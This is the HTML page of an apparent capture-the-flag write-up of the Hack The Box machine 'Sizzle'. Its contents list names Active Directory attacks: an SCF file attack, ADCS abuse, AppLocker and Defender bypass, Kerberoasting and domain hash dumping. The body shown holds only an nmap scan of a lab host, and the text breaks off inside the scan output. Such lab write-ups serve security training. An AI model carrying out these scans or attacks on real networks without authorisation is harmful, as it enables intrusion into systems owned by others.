<!DOCTYPE html>
<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>HTB Sizzle - Insane &middot; Ani blog</title>
  <meta name="title" content="HTB Sizzle - Insane &middot; Ani blog" />
  
  <meta name="description" content="Writeup of the Sizzle boxe from htb prep Offshore Prolabs" />
  <meta name="keywords" content="kerberoasting, Active Directory, " />
  
  
  <link rel="canonical" href="http://0.0.0.0:1313/posts/sizzle/" />
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.7e511937ade47127f0cc4d4943b7cc62b8f7cf37a9c19383694c5760ad479781345dbedf1b713a57a80254844a8966c81cb86298461c8f60c196036e053f9605.css"
    integrity="sha512-flEZN63kcSfwzE1JQ7fMYrj3zzepwZODaUxXYK1Hl4E0Xb7fG3E6V6gCVIRKiWbIHLhimEYcj2DBlgNuBT&#43;WBQ==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.b1ff386a04e20f5b2a947631723650ebf889270957d4fc7fe122134419a5d06f01c802a70e8250857c6d8049a2cda419bab125783a7ffb26e3c402f3106c2921.js"
    integrity="sha512-sf84agTiD1sqlHYxcjZQ6/iJJwlX1Px/4SITRBml0G8ByAKnDoJQhXxtgEmizaQZurEleDp/&#43;ybjxALzEGwpIQ=="></script>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.efbf3b6b987689fffaf2d7b73173d2690c0279a04d444b0537a77d7f4ff6e6d493445400cb0cf56bc0f0f123e19f15394e63cae34e67f069bd013dd5c73df56e.js"
    integrity="sha512-7787a5h2if/68te3MXPSaQwCeaBNREsFN6d9f0/25tSTRFQAywz1a8Dw8SPhnxU5TmPK405n8Gm9AT3Vxz31bg==" data-copy="" data-copied=""></script>
  
  
  
  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  <meta property="og:url" content="http://0.0.0.0:1313/posts/sizzle/">
  <meta property="og:site_name" content="Ani blog">
  <meta property="og:title" content="HTB Sizzle - Insane">
  <meta property="og:description" content="Writeup of the Sizzle boxe from htb prep Offshore Prolabs">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-04-29T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-04-29T00:00:00+00:00">
    <meta property="article:tag" content="Kerberoasting">
    <meta property="article:tag" content="Active Directory">

  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="HTB Sizzle - Insane">
  <meta name="twitter:description" content="Writeup of the Sizzle boxe from htb prep Offshore Prolabs">

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "HTB Sizzle - Insane",
    "headline": "HTB Sizzle - Insane",
    "description": "Writeup of the Sizzle boxe from htb prep Offshore Prolabs",
    
    "inLanguage": "en",
    "url" : "http:\/\/0.0.0.0:1313\/posts\/sizzle\/",
    "author" : {
      "@type": "Person",
      "name": "Anh4ckin3"
    },
    "copyrightYear": "2024",
    "dateCreated": "2024-04-29T00:00:00\u002b00:00",
    "datePublished": "2024-04-29T00:00:00\u002b00:00",
    
    "dateModified": "2024-04-29T00:00:00\u002b00:00",
    
    "keywords": ["kerberoasting","Active Directory"],
    
    "mainEntityOfPage": "true",
    "wordCount": "1477"
  }]
  </script>


  
  
  <meta name="author" content="Anh4ckin3" />
  
  
  
  <link href="https://github.com/Anh4ckin3" rel="me" />
  
  
  <link href="https://x.com/LeandreOnizuka" rel="me" />
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>






















  
  



  
  
  <meta name="theme-color"/>
  
  
</head>
<body
  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
  <div id="the-top" class="absolute flex self-center">
    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
      href="#main-content"><span
        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
  </div>
  
  
  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
    
    
    
    <div>
        <a href="/" class="flex">
            <span class="sr-only">Ani blog</span>

            
            <img src="/img/icon-deathstart.png" width="256" height="256"
                class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="Ani blog" />
            

        </a>
    </div>
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Ani blog</a>
            

        </nav>
        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">

            
            
            
  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        Blog
    </p>
</a>



            
            
  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="">
        About
    </p>
</a>



            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class="ltr:mr-14 rtl:ml-14 flex items-center">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
                    <div class="flex items-center justify-center dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
                <div class="flex items-center justify-center dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 -mr-2 md:hidden">

        <label id="menu-button" class="block">
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" style="padding-top:5px;"
                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li id="menu-close-button">
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            Blog
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="">
            About
        </p>
    </a>
</li>




                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>





  
  <div class="relative flex flex-col grow">
    <main id="main-content" class="grow">
      


<article>
  
  
  
  
  
  
 

  
  

  <header id="single_header" class="mt-5 max-w-prose">
    
    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      HTB Sizzle - Insane
    </h1>
    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
      





  
  







  





  



  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2024-04-29T00:00:00&#43;00:00">29 April 2024</time><span class="px-2 text-primary-500">&middot;</span><span>1477 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
  

  
  
</div>








    </div>

    
    
    
    
    

    

    
      
      
        
        
<div class="flex author">
  
    
    
      
    
    
      
        
      
      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
      alt="Anh4ckin3" src="/img/thorfinn_hu6780222513437282985.jpg" />
    
  
  <div class="place-self-center">
    
    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
      Author
    </div>
    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
      Anh4ckin3
    </div>
    
    
    <div class="text-sm text-neutral-700 dark:text-neutral-400">I love star wars and pentesting</div>
    
    <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/Anh4ckin3"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>

</span></a
        >
      
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://x.com/LeandreOnizuka"
          target="_blank"
          aria-label="X-Twitter"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
  </span>

</span></a
        >
      
    
  </div>

</div>
  </div>
</div>

      

      

      
      <div class="mb-5"></div>
      

    

  </header>
  
  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
    
     <div
      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">

         <details open id="TOCView"
  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#scanning-"><strong>Scanning :</strong></a></li>
    <li><a href="#enumerat-smb-"><strong>Enumerat SMB :</strong></a></li>
    <li><a href="#scf-file-attack-"><strong>SCF file Attack :</strong></a></li>
    <li><a href="#abuse-adcs-to-get-psremote-session-"><strong>Abuse ADCS to get PSremote session :</strong></a></li>
    <li><a href="#bypass-applocker-and-defender-"><strong>Bypass Applocker and defender :</strong></a></li>
    <li><a href="#exploit-kerberoasting-"><strong>Exploit Kerberoasting :</strong></a></li>
    <li><a href="#dump-domain-hashs-"><strong>Dump domain hashs :</strong></a></li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#scanning-"><strong>Scanning :</strong></a></li>
    <li><a href="#enumerat-smb-"><strong>Enumerat SMB :</strong></a></li>
    <li><a href="#scf-file-attack-"><strong>SCF file Attack :</strong></a></li>
    <li><a href="#abuse-adcs-to-get-psremote-session-"><strong>Abuse ADCS to get PSremote session :</strong></a></li>
    <li><a href="#bypass-applocker-and-defender-"><strong>Bypass Applocker and defender :</strong></a></li>
    <li><a href="#exploit-kerberoasting-"><strong>Exploit Kerberoasting :</strong></a></li>
    <li><a href="#dump-domain-hashs-"><strong>Dump domain hashs :</strong></a></li>
  </ul>
</nav>
  </div>
</details>

<script>

  var margin = 200;
  var marginError = 50;

  (function () {
    var $window = $(window);
    var $toc = $('#TOCView');
    var tocHeight = $toc.height();

    function onResize() {
      var windowAndMarginHeight = $window.height() - margin;
      if(tocHeight >= windowAndMarginHeight) {
        $toc.css("overflow-y", "scroll")
        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
      } else {
        $toc.css("overflow-y", "hidden")
        $toc.css("max-height", "9999999px")
      }
    }

    $window.on('resize', onResize);
    $(document).ready(onResize);
  })();



</script>
   </div>
      </div>
      

      <div class="min-w-0 min-h-0 max-w-fit">
        
        


        <div class="article-content max-w-prose mb-20">
          <p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /img/sizzle/Untitled_hu7525290128628695959.png 330w,
        /img/sizzle/Untitled_hu6123940523125654544.png 660w,
        /img/sizzle/Untitled_hu7777960815642716002.png 1024w,
        /img/sizzle/Untitled_hu9440379870749849696.png 2x"
        src="/img/sizzle/Untitled_hu6123940523125654544.png"
        alt="Untitled"
      />
      
    </figure>
</p>


<h2 class="relative group"><strong>Scanning :</strong> 
    <div id="scanning-" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#scanning-" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Run nmap scan to get open ports and services.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">sV</span> <span class="o">-</span><span class="nx">sC</span> <span class="o">-</span><span class="nx">T4</span> <span class="o">-</span><span class="nx">Pn</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.103</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">21</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">ftp</span>           <span class="nx">Microsoft</span> <span class="nx">ftpd</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">ftp</span><span class="o">-</span><span class="nx">syst</span><span class="o">:</span> 
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>  <span class="nx">SYST</span><span class="o">:</span> <span class="nx">Windows_NT</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_ftp</span><span class="o">-</span><span class="nx">anon</span><span class="o">:</span> <span class="nx">Anonymous</span> <span class="nx">FTP</span> <span class="nx">login</span> <span class="nx">allowed</span> <span class="p">(</span><span class="nx">FTP</span> <span class="nx">code</span> <span class="mi">230</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">53</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">domain</span>        <span class="nx">Simple</span> <span class="nx">DNS</span> <span class="nx">Plus</span>
</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">http</span>          <span class="nx">Microsoft</span> <span class="nx">IIS</span> <span class="nx">httpd</span> <span class="mf">10.0</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="o">:</span> 
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>  <span class="nx">Potentially</span> <span class="nx">risky</span> <span class="nx">methods</span><span class="o">:</span> <span class="nx">TRACE</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="o">:</span> <span class="nx">Site</span> <span class="nx">doesn</span><span class="s1">&#39;t have a title (text/html).
</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-server-header: Microsoft-IIS/10.0
</span></span></span><span class="line"><span class="cl"><span class="s1">135/tcp  open  msrpc         Microsoft Windows RPC
</span></span></span><span class="line"><span class="cl"><span class="s1">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span></span><span class="line"><span class="cl"><span class="s1">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
</span></span></span><span class="line"><span class="cl"><span class="s1">|_ssl-date: 2024-05-01T15:40:11+00:00; +4s from scanner time.
</span></span></span><span class="line"><span class="cl"><span class="s1">| ssl-cert: Subject: commonName=sizzle.htb.local
</span></span></span><span class="line"><span class="cl"><span class="s1">| Not valid before: 2018-07-03T17:58:55
</span></span></span><span class="line"><span class="cl"><span class="s1">|_Not valid after:  2020-07-02T17:58:55
</span></span></span><span class="line"><span class="cl"><span class="s1">443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
</span></span></span><span class="line"><span class="cl"><span class="s1">| tls-alpn: 
</span></span></span><span class="line"><span class="cl"><span class="s1">|   h2
</span></span></span><span class="line"><span class="cl"><span class="s1">|_  http/1.1
</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-title: Site doesn&#39;</span><span class="nx">t</span> <span class="nx">have</span> <span class="nx">a</span> <span class="nx">title</span> <span class="p">(</span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">)</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">http</span><span class="o">-</span><span class="nx">methods</span><span class="o">:</span> 
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span>  <span class="nx">Potentially</span> <span class="nx">risky</span> <span class="nx">methods</span><span class="o">:</span> <span class="nx">TRACE</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="o">:</span> <span class="nx">Subject</span><span class="o">:</span> <span class="nx">commonName</span><span class="o">=</span><span class="nx">sizzle</span><span class="o">.</span><span class="nx">htb</span><span class="o">.</span><span class="nx">local</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="k">Not</span> <span class="nx">valid</span> <span class="nx">before</span><span class="o">:</span> <span class="mi">2018</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mo">03</span><span class="nx">T17</span><span class="o">:</span><span class="mi">58</span><span class="o">:</span><span class="mi">55</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_Not</span> <span class="nx">valid</span> <span class="nx">after</span><span class="o">:</span>  <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mo">02</span><span class="nx">T17</span><span class="o">:</span><span class="mi">58</span><span class="o">:</span><span class="mi">55</span>
